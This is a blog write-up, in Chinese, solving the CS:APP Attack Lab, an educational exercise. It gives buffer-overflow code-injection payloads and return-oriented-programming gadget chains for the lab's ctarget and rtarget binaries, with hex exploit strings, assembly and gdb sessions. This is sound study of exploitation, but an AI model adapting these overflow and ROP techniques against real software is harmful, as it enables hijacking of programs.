---
title: "[CSAPPLAB]Attack Lab"
date: 2021-05-9
draft: false
---

**ctarget**
首先执行getbuf函数，读取标准输入。

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

参数 (ctarget和rtarget都有)
-q 不发送成绩
-i 从文件中输入
如果你没有使用-q，就会出现

FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。

### 1.1level 1

观察test，getbuf和touch1

目的：将getbuf的返回地址由test改为touch1

小建议

- 利用`objdump -d ./ctarget>>ctarget.s`得到汇编代码
- 思路是将`touch1`的开始地址，放在某个位置，以实现当`ret`指令被`getbuf`执行后会将控制权转移给`touch1`
- 一定要注意字节序
- 你可以使用`gdb`设置断点来进行调试。并且`gcc`会影响栈帧中`buf`存放的位置。需要注意

思路：getbuf函数执行**ret**指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。

```sh
(gdb) p (char*)0x403188
#p(print) 0x403188上存的值
$1 = 0x403188 "No exploit.  Getbuf returned 0x%x\n"
```


stack : `padding(00..) + touch1(0x4017c0)`

<img src="https://www.kro1lsec.com:442/images/2021/05/09/20210509204946.png" alt="image-20210509110813023" style="zoom:50%;" />

攻击序列touch1.txt

```text
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。

```sh
./hex2raw <touch1.txt>2.txt 
./ctarget -qi 2.txt
```

![image-20210428160021166](https://www.kro1lsec.com:442/images/2021/04/28/20210428160021.png)

### **1.2level 2**

要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie

小建议

- `touch2`的参数`val`是利用`rdi`寄存器进行传递的
- 你要利用某种方式让`getbuf`的返回地址为`touch2`的地址
- 你的注入代码的传入参数应该等于`cookie`的值。
- 不要在注入代码内调用`ret`或者`call`
- 请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。

`touch2`的代码如下

```c
 void touch2(unsigned val)
 {
     vlevel = 2; /* Part of validation protocol */
     if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
     } else {
          printf("Misfire: You called touch2(0x%.8x)\n", val);
          fail(2);
    }
   exit(0);
 }
```

逻辑：比较我们传入的参数`val`是否等于`cookie`的值，如果等于就可以通过。

本题的关键就是在改变返回地址前也设置`rdi`寄存器的值。

插入的汇编代码

```text
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

查看他的字节序表示

```sh
Attack Lab$ vim l2.s
Attack Lab$ gcc -c l2.s
Attack Lab$ objdump -d l2.o

l2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq  
```

stack : `padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)`

<img src="https://www.kro1lsec.com:442/images/2021/05/09/20210509204939.png" alt="image-20210504202508398" style="zoom: 50%;" />

```touch2.txt
48 c7 c7 fa
97 b9 59 68
ec 17 40 00
c3 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
78 dc 61 55
```

```sh
Attack Lab$ ./hex2raw <touch2.txt>2.txt 
Attack Lab$ ./ctarget -qi 2.txt 
```

### **1.3level 3**

`hexmatch`和`touch3`的代码如下。

```c
/* Compare string to hex represention of unsigned value */
 int hexmatch(unsigned val, char *sval)
{
     char cbuf[110];
     /* Make position of check string unpredictable */
     char *s = cbuf + random() % 100;
     sprintf(s, "%.8x", val); //s=val=cookie
     return strncmp(sval, s, 9) == 0; //比较cookie和第二个参数的前9位是否相同
   // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为'\0'
 }
void touch3(char *sval)
 {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) { //相同则成功
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
    } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
    exit(0);
 }
```

**任务:** 你的任务`getbuf`之后执行`touch3`而不是继续执行test。你必须要传递`cookie`字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。

小建议

- 你需要在利用缓冲区溢出的字符串中包含`cookie`的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x
- 注意在c语言中的字符串表示会在末尾处加一个`\0`
- 您注入的代码应将寄存器％rdi设置为此字符串的地址
- 调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放`getbuf`使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的`Cookie`字符串

字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。
而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)

**简单分析touch3**

```cpp
00000000004018fa <touch3>:
  4018fa: 53                    push   %rbx
  4018fb: 48 89 fb              mov    %rdi,%rbx
  4018fe: c7 05 d4 2b 20 00 03  movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905: 00 00 00 
  401908: 48 89 fe              mov    %rdi,%rsi
  40190b: 8b 3d d3 2b 20 00     mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911: e8 36 ff ff ff        callq  40184c <hexmatch>
  401916: 85 c0                 test   %eax,%eax
```

逻辑非常简单首先把`rdi`的值传递给`rsi`然后把`cookie`的值传递给`rdi`调用hexmatch函数。这里`rsi`的值应该就是我们的字符串数组的起始地址。

这里我们注意`hexmatch`函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串`s`的地址我们是没法估计 的。并且提示中告诉了我们`hexmatch`和`strncmp`函数可能会覆盖我们`getbuf`的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到`text`的栈帧中。我们在`getbuf`分配栈帧之前打一个断点。

```sh
b *0x4017a8
(gdb) b *0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) r -q  #gdb调试时传参数放在里面
Starting program: /csapp/attack/ctarget -q
warning: Error disabling address space randomization: Operation not permitted
Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12  buf.c: No such file or directory.
(gdb) info r rsp
rsp            0x5561dca0          0x5561dca0
```

stack : `padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))`

<img src="https://www.kro1lsec.com:442/images/2021/05/09/20210509204933.png" alt="image-20210509111631975" style="zoom:50%;" />

```
48 c7 c7 a8 dc 61 55 68 <-读入我们要执行的汇编语句
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 <-返回地址为rsp 
```

```sh
Attack Lab$ ./hex2raw <touch3.txt>3.txt 
Attack Lab$ ./ctarget -qi 3.txt 
```

### **2.1level 4**

思考：
首先要把cookie传入%rdi，然后再转入到touch2函数。

根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi


这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。

方法一

```
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
cc 19 40 00 00 00 00 00     /* jump 0x4019cc; popq %rax         */
fa 97 b9 59 00 00 00 00     /* cookie                           */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5; movq %rax, %rdi   */
ec 17 40 00 00 00 00 00     /* touch2                           */
```

方法二

```sh
@le2.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 2b 40 00 00 00 00 00 #pop %rdi
fa 97 b9 59 00 00 00 00 #cookie
ec 17 40 00 00 00 00 00 #touch2
```

```sh
./hex2raw < le2.txt | ./rtarget -q
```

### **2.2level 5**

肝不动了，参考别人的。

思考：

同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。

首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。

第二个问题，一开始在gadgets farm找到许多如下的操作：

mov    $0x909078fb,%eax
lea    -0x3c3876b8(%rdi),%eax
movl   $0xc7c78948,(%rdi)
......
所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。

后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。

exploit-5
关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。

```
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
06 1a 40 00 00 00 00 00     /* jump 0x401a06               ;movq %rsp, %rax */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
ab 19 40 00 00 00 00 00     /* jump 0x4019ab               ;popq %rax       */
48 00 00 00 00 00 00 00     /* distance from here to cookie string          */
dd 19 40 00 00 00 00 00     /* jump 0x4019dd               ;movl %eax, %edx */
34 1a 40 00 00 00 00 00     /* jump 0x401a34               ;movl %edx, %ecx */
13 1a 40 00 00 00 00 00     /* jump 0x401a13               ;movl %ecx, %esi */
d6 19 40 00 00 00 00 00     /* jump 0x4019d6        ;lea (%rdi,%rsi,1),%rax */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
fa 18 40 00 00 00 00 00     /* touch3                                       */
35 39 62 39 39 37 66 61     /* cookie string                                */
00 00 00 00 00 00 00 00     /* string ends with 00                          */
```

